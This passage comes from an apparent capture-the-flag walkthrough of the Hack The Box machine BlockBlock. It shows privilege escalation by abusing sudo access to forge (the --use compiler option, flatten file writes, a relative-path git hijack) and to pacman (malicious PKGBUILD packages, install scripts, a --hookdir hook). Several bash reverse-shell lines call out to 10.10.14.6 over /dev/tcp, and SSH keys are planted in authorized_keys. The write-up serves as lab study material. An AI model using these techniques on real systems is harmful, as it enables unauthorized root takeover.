      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as keira]-->B(<a href='#via-build'>build Command\n--use Execution</a>);
    B-->C[Shell as paul];
    A-->D(<a href='#via-flatten'>flatten Command\nFile Write</a>);
    D-->C;
    A-->E(<a href='#via-path-hijack'>Relative\nPath Hijack</a>);
    E-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,2,3,4,5 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### Via build

The `build` command ([docs](https://book.getfoundry.sh/reference/forge/forge-build)) in `forge` has a `--use` option:

> `--use` *solc\_version*
> Specify the solc version, or a path to a local solc, to build with.
>
> Valid values are in the format `x.y.z`, `solc:x.y.z` or `path/to/solc`.

This invokes a specific binary as the compiler!

I’ll create a simple [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) and set it as executable:

```

[keira@blockblock shm]$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.6/443 0>&1' | tee shell.sh
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.6/443 0>&1
[keira@blockblock shm]$ chmod +x shell.sh

```

Running `forge build --use ./shell.sh` hangs:

```

[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge build --use ./shell.sh 

```

At my listening `nc`, there’s a shell as paul:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.43 35350
[paul@blockblock shm]$ id
uid=1001(paul) gid=1001(paul) groups=1001(paul)

```

#### Via flatten

The `flatten` command is meant to:

> Flatten a source file and all of its imports into one file.

It takes a file as input, and has options for output path:

> `-o` *file*
> `--output` *file*
> The path to output the flattened contract. If not specified, the flattened contract will be output to stdout.

This sounds like file read / file write.

If I don’t use the output, I can basically read a file:

```

[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten /etc/hosts
[⠃] Compiling...
// /etc/hosts
127.0.0.1 localhost blockblock blockblock.htb
127.0.1.1 blockblock
[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten /home/paul/.bash_profile
[⠃] Compiling...
// /home/paul/.bash_profile
#
# ~/.bash_profile
#

[[ -f ~/.bashrc ]] && . ~/.bashrc

```

There’s doesn’t seem to be an `authorized_keys` file or a `id_rsa` in `.ssh` for paul:

```

[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten /home/paul/.ssh/authorized_keys
Error: 
No such file or directory (os error 2)
[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten /home/paul/.ssh/id_rsa
Error: 
No such file or directory (os error 2)

```

I’ll write my public key to a file on BlockBlock:

```

[keira@blockblock shm]$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > pub

```

`flatten` can read it, and write it:

```

[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten pub
[⠃] Compiling...
// pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing

[keira@blockblock shm]$ sudo -u paul /home/paul/.foundry/bin/forge flatten pub -o /home/paul/.ssh/authorized_keys
[⠃] Compiling...
Flattened file written at /home/paul/.ssh/authorized_keys

```

With the public key in place, SSH as paul works:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen paul@10.10.11.43
[paul@blockblock ~]$ 

```

#### Via Path Hijack

The intended way to exploit this was using a relative path exploit. There is a place in `forge` where it calls `git remote get-url origin` without using the full path. This happens on [line 82](https://github.com/foundry-rs/foundry/blob/e0f87ad31d929abcf7f0eb96952e1805dc9d2c22/crates/forge/src/cmd/doc/mod.rs#L82) of `mod.rs` in the `forge` source:

```

if doc_config.repository.is_none() {
    // Attempt to read repo from git
    if let Ok(output) = Command::new("git").args(["remote", "get-url", "origin"]).output() {
        if !output.stdout.is_empty() {
            let remote = String::from_utf8(output.stdout)?.trim().to_owned();
            if let Some(captures) = GH_REPO_PREFIX_REGEX.captures(&remote) {
                let brand = captures.name("brand").unwrap().as_str();
                let tld = captures.name("tld").unwrap().as_str();
                let project = GH_REPO_PREFIX_REGEX.replace(&remote, "");
                doc_config.repository = Some(format!(
                    "https://{brand}.{tld}/{}",
                    project.trim_end_matches(".git")
                ));
            }
        }
    }
}

```

This can be found a few ways. One thing to search for would be places the Rust program is calling other programs, which is done with `Command::new`. I can search for that in GitHub and notice the top result is in `forge` and not using an absolute path for `git`:

![image-20250324144417043](/img/image-20250324144417043.png)

That’s actually not the first place I hit a call to `git` when running `forge build`. In `forge build`, there’s a call on [line 72 of build.rs](https://github.com/foundry-rs/foundry/blob/e0f87ad31d929abcf7f0eb96952e1805dc9d2c22/crates/forge/src/cmd/build.rs#L72) to `install_missing_dependencies`. That’s defined on [lines 94-107](https://github.com/foundry-rs/foundry/blob/master/crates/forge/src/cmd/install.rs#L94-L107) of `install.rs`, which calls `has_missing_dependencies`. That function is defined on [lines 480-490 of `mod.rs`](https://github.com/foundry-rs/foundry/blob/e0f87ad31d929abcf7f0eb96952e1805dc9d2c22/crates/forge/src/cmd/doc/mod.rs#L480-L490):

```

    pub fn has_missing_dependencies<I, S>(self, paths: I) -> Result<bool>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<OsStr>,
    {
        self.cmd()
            .args(["submodule", "status"])
            .args(paths)
            .get_stdout_lossy()
            .map(|stdout| stdout.lines().any(|line| line.starts_with('-')))
    }

```

As this is at the top of the `build` path, it’s called every time `forge build` is called.

I could also use the Rust logger, which is configured by the the `RUST_LOG` environment variable. I’ll get a copy of `forge` on my host, and run it:

```

oxdf@hacky$ PATH=. RUST_LOG=trace ./forge build
2025-03-24T18:53:12.553141Z TRACE foundry_config::providers::remappings: get all remappings from "/media/sf_CTFs/hackthebox/blockblock-10.10.11.43"
2025-03-24T18:53:12.553462Z TRACE foundry_config::providers::remappings: find all remappings in lib path: "/media/sf_CTFs/hackthebox/blockblock-10.10.11.43/lib"
2025-03-24T18:53:12.555666Z TRACE foundry_cli::utils: executing command=cd "/media/sf_CTFs/hackthebox/blockblock-10.10.11.43" && "git" "submodule" "status" "/home/oxdf/hackthebox/blockblock-10.10.11.43/lib"
2025-03-24T18:53:12.559045Z DEBUG version: foundry_compilers::compilers::vyper: getting Vyper version cmd="vyper" "--version"
Nothing to compile

```

There is a call to `git submodule status`.

To exploit this, I’ll just copy my reverse shell from [above](#via-build) into a file named `git` and run:

```

[keira@blockblock shm]$ cp shell.sh git
[keira@blockblock shm]$ sudo -u paul PATH=.:$PATH /home/paul/.foundry/bin/forge build

```

It hangs, but at my `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.43 46866
[paul@blockblock shm]$ 

```

## Shell as root

### Enumeration

paul can run `pacman` as any user without a password using `sudo`:

```

[paul@blockblock ~]$ sudo -l
User paul may run the following commands on blockblock:
    (ALL : ALL) NOPASSWD: /usr/bin/pacman

```

### PacMan Exploitation

#### Background

`pacman` is the [package manager for Arch Linux](https://wiki.archlinux.org/title/Pacman). Much like `apt` on Debian based OSes, or `yum` on Redhat-based ones, it installs applications from repositories.

[This page](https://wiki.archlinux.org/title/Creating_packages) from the Arch wiki talks about how to create a package. [This page](https://wiki.archlinux.org/title/PKGBUILD) talks about the `PKGBUILD` file. I found [this tutorial](https://docs.vultr.com/building-packages-on-arch-linux) from Vultr helpful as well.

There are numerous ways to exploit this. I’ll show three strategies (each of which has multiple ways to exploit):

```

flowchart TD;
    subgraph identifier[" "]
      direction LR
      start1[ ] --->|intended| stop1[ ]
      style start1 height:0px;
      style stop1 height:0px;
      start2[ ] --->|unintended| stop2[ ]
      style start2 height:0px;
      style stop2 height:0px;
    end
    A[Shell as paul]-->B("<a href='#file-write-in-package'>File Write\nin package()</a>");
    B-->C[Shell as root];
    A-->D(<a href='#install-script'>install Script</a>);
    D-->C;
    A-->E(<a href='#hookdir'>--hookdir</a>);
    E-->C;

linkStyle default stroke-width:2px,stroke:#FFFF99,fill:none;
linkStyle 1,4,5,6,7 stroke-width:2px,stroke:#4B9CD3,fill:none;
style identifier fill:#1d1d1d,color:#FFFFFFFF;

```

#### File Write In package()

Creating a package involves generating a `PKGBUILD` file. There is a `build()` function that isn’t useful to me here, but also a `package()` function that is responsible for installing files.

There’s a couple ways I could take this. One would be to write a SetUID/SetGID `bash`. For example, I’ll create a directory in `/dev/shm` to work from:

```

[paul@blockblock shm]$ mkdir oxdf
[paul@blockblock shm]$ cd oxdf/

```

I’ll create a `PKGBUILD` file:

```

pkgname=oxdf
pkgver=0.0.1
pkgrel=1
pkgdesc="privesc"
url=https://0xdf.gitlab.io
source=("pub")
arch=("x86_64")
license=("GPL2")

build() {
    echo "building oxdf for takeover"
}

package() {
    install -Dm755 "$srcdir/pub" "$pkgdir//root/.ssh/authorized_keys"
}

```

I’m having it write as 755 because that’s what the permissions on `/root` and `/root/.ssh` are typically. It’s referencing the `pub` file with my public SSH key in it, which I’ll copy into this directory as well.

To make this into a package, I’ll run `makepkg`:

```

[paul@blockblock oxdf]$ ls
PKGBUILD  pub
[paul@blockblock oxdf]$ makepkg 
==> Making package: oxdf 0.0.1-1 (Mon 24 Mar 2025 09:26:40 PM UTC)
==> Checking runtime dependencies...
==> Checking buildtime dependencies...
==> Retrieving sources...
  -> Found pub
==> ERROR: Integrity checks are missing for: source

```

It fails because I left out the `sha256sum` line. I can add that with the hash of the files I’m including, or just use `--skipinteg`:

```

[paul@blockblock oxdf]$ makepkg --skipinteg
==> Making package: oxdf 0.0.1-1 (Mon 24 Mar 2025 09:27:32 PM UTC)
==> Checking runtime dependencies...
==> Checking buildtime dependencies...
==> Retrieving sources...
  -> Found pub
==> WARNING: Skipping all source file integrity checks.
==> Extracting sources...
==> Starting build()...
building oxdf for takeover
==> Entering fakeroot environment...
==> Starting package()...
==> Tidying install...
  -> Removing libtool files...
  -> Purging unwanted files...
  -> Removing static library files...
  -> Stripping unneeded symbols from binaries and libraries...
  -> Compressing man and info pages...
==> Checking for packaging issues...
==> Creating package "oxdf"...
  -> Generating .PKGINFO file...
  -> Generating .BUILDINFO file...
  -> Generating .MTREE file...
  -> Compressing package...
==> Leaving fakeroot environment.
==> Finished making: oxdf 0.0.1-1 (Mon 24 Mar 2025 09:27:33 PM UTC)
[paul@blockblock oxdf]$ ls
oxdf-0.0.1-1-x86_64.pkg.tar.zst  pkg  PKGBUILD  pub  src

```

The output of `build` is printed in that process (but since I didn’t build as root, there’s not much value to having anything there). The results are a `.pkg.tar.zst` file and some directories.

I’ll run `pacman` to install this, putting my public key into `/root/.ssh/authorized_keys`:

```

[paul@blockblock oxdf]$ sudo /usr/bin/pacman -U oxdf-0.0.1-1-x86_64.pkg.tar.zst 
loading packages...
resolving dependencies...
looking for conflicting packages...

Packages (1) oxdf-0.0.1-1

Total Installed Size:  0.00 MiB

:: Proceed with installation? [Y/n] y
(1/1) checking keys in keyring                                         [########################################] 100%
(1/1) checking package integrity                                       [########################################] 100%
(1/1) loading package files                                            [########################################] 100%
(1/1) checking for file conflicts                                      [########################################] 100%
(1/1) checking available disk space                                    [########################################] 100%
:: Processing package changes...
(1/1) installing oxdf                                                  [########################################] 100%

```

Now the key is there, and I can SSH as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.11.43
Last login: Mon Mar 24 21:32:43 2025 from 10.10.14.6
[root@blockblock ~]#

```

There’s a bunch of other ways I could abuse this. Other files to overwrite. Or I could include a copy of `bash` and set it as SetUID/SetGID:

```

package() {
    install -Dm6777 -o root -g root "/bin/bash" "$pkgdir//var/tmp/0xdf"
}

```

I’m using `/var/tmp` because both `/dev/shm` and `/tmp` are mounted with `nosuid`:

```

[paul@blockblock oxdf]$ mount | grep -e '/dev/shm' -e '/tmp'
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,inode64)
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,nr_inodes=1048576,inode64)

```

#### install Script

An alternative way to get execution during install is using install scripts with the `install` keyword in the `PKGBUILD` file. In a new directory, I’ll create a new `PKGBUILD` file:

```

pkgname=oxdf-install
pkgver=0.0.1
pkgrel=1
pkgdesc="privesc"
url=https://0xdf.gitlab.io
arch=("x86_64")
license=("GPL2")
install=shell.sh

build() {
    echo "building oxdf for takeover"
}

package() {
    echo "hello from the package function"
}

```

The `install` [directive](https://wiki.archlinux.org/title/PKGBUILD#install) identifies a script with functions such as `pre_install`, `post_install`, etc, and these functions (if defined) are called during parts of the process. I’ll create a `shell.sh` in the same directory that gives a reverse shell before installing:

```

[paul@blockblock oxdf-install]$ ls
PKGBUILD  shell.sh
[paul@blockblock oxdf-install]$ cat shell.sh 
#!/bin/bash

pre_install() {
    bash -i >& /dev/tcp/10.10.14.6/443 0>&1
}

```

I’ll build it with `makepkg`, and then install with `sudo pacman -U`, and it hangs mid way:

```

[paul@blockblock oxdf-install]$ sudo /usr/bin/pacman -U oxdf-install-0.0.1-1-x86_64.pkg.tar.zst 
loading packages...
resolving dependencies...
looking for conflicting packages...

Packages (1) oxdf-install-0.0.1-1

:: Proceed with installation? [Y/n] 
(1/1) checking keys in keyring                                         [########################################] 100%
(1/1) checking package integrity                                       [########################################] 100%
(1/1) loading package files                                            [########################################] 100%
(1/1) checking for file conflicts                                      [########################################] 100%
(1/1) checking available disk space                                    [########################################] 100%
:: Processing package changes...

```

It hangs, and there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.43 44864
[root@blockblock /]# 

```

That script doesn’t have to do a reverse shell. It could just as easily written to `authorized_keys`, `sudoers`, `passwd`, or made a SetUID / SetGID copy of `bash`.

#### –hookdir

Rather than making my own package, another strategy is to use the `--hookdir` option of `pacman`:

> ```

>  ``` 
>  --hookdir <dir>  set an alternate hook location
>  ```

>
> ```

The hook location is where the application looks for files ending in `.hook` which define things that should run before and after `pacman` does things.

There are example hook files in [this repo](https://github.com/andrewgregory/pachooks/tree/master/hooks). I’ll create mine from those:

```

[paul@blockblock shm]$ cat oxdf.hook 
[Trigger]
Operation = Install
Operation = Upgrade
Type = File
Target = *

[Action]
When = PreTransaction
Exec = /dev/shm/shell.sh

```

This says before running the operation, run `shell.sh`. I’ll run this:

```

[paul@blockblock shm]$ sudo pacman -U /var/cache/pacman/pkg/file-5.45-1-x86_64.pkg.tar.zst --hookdir /dev/shm
loading packages...
warning: file-5.45-1 is up to date -- reinstalling
resolving dependencies...
looking for conflicting packages...

Packages (1) file-5.45-1

Total Installed Size:  8.33 MiB
Net Upgrade Size:      0.00 MiB

:: Proceed with installation? [Y/n] 
(1/1) checking keys in keyring                                         [########################################] 100%
(1/1) checking package integrity                                       [########################################] 100%
(1/1) loading package files                                            [########################################] 100%
(1/1) checking for file conflicts                                      [########################################] 100%
(1/1) checking available disk space                                    [########################################] 100%
:: Running pre-transaction hooks...
(1/1) oxdf.hook

```

It hangs processing my hooks, and there’s a shell at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.43 50410
[root@blockblock /]# 

```